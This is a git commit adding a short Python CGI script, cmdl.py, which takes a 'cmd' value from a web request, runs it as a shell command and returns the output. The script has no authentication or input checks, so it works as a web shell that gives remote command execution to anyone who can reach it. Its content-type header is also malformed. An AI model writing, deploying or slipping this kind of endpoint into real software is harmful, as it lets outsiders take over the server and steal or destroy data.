dc72636c4a24fef1a42a6cb88dfd2ec8d3e17f75
Mohd Rizwan Mohiuddin <109415364+Rizwan-mohiuddin@users.noreply.github.com>
2023-09-17 10:17:43 +0530

    Add files via upload

---
+++ cmdl.py
@@ -0,0 +1,10 @@
+print("content:text/html")
+print()
+
+import cgi
+import subprocess
+data=cgi.FieldStorage()
+command=data.getvalue("cmd")
+print(command)
+output=subprocess.getstatusoutput("{}".format(command))
+print(output[1])
